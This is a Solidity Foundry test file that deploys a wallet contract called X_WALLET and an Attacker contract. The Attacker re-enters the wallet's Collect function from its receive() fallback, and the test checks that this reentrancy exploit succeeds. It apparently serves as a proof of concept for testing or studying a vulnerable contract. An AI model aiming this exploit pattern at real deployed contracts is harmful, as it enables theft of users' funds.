
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {X_WALLET} from "../src/X_WALLET.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyX_WALLET is Test {

    X_WALLET public x_wallet;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        x_wallet = new X_WALLET(address(logFile));
        _attacker = new Attacker(address(x_wallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 0.5 ether);
        vm.assume(attackVal < 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        vm.deal(address(x_wallet), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public x_wallet;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public reentryBalanceSnapshot;
    uint256 public storedAm;

    constructor(address victimAddress) { 
        x_wallet = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        x_wallet.Put{value: 2 * val}(0);
    }

    function attack(uint256 val) public {
        storedAm = val;
        initialSnapshot = x_wallet.Acc(address(this)).balance;

        x_wallet.Collect(val);

        if (attackCallCount == 2 && reentryBalanceSnapshot == initialSnapshot && initialSnapshot == 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            reentryBalanceSnapshot = x_wallet.Acc(address(this)).balance;
            attackCallCount++;
            x_wallet.Collect(storedAm);
        }
    }
}
